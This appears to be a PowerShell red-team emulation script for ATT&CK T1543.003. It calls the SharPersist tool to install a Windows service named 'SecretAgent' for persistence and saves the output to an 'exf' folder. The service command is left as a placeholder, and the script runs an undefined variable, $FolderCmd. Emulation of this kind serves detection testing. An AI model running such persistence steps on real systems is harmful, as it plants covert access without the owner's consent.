# Add Windows Service
# Technic ID : T1543.003
Clear-Host
Write-Output "==============================================================================="
Write-Output "Create or Modify System Process: Windows Service (T1543.003)"
Write-Output "==============================================================================="
#
$SharPersist = "$env:PUBLIC\Toolz\SharPersist.exe";
$service_file = "$env:PUBLIC\exf\persist_service.txt";
$startup_dir_file = "$env:PUBLIC\exf\persist_startdir.txt";
if ([System.IO.File]::Exists("$SharPersist")) {
    $ServiceCmd = "$SharPersist" + " -t service -c #{location} -n SecretAgent -m add";
    Invoke-Expression "$ServiceCmd"  | Out-File -FilePath "$service_file";
    Invoke-Expression "$FolderCmd" | Out-File -FilePath "$startup_dir_file";
    exit 0;
}
else { 
    "The command $SharPersist does not exists !!!" | Out-File -FilePath "$service_file";
    exit 1;
};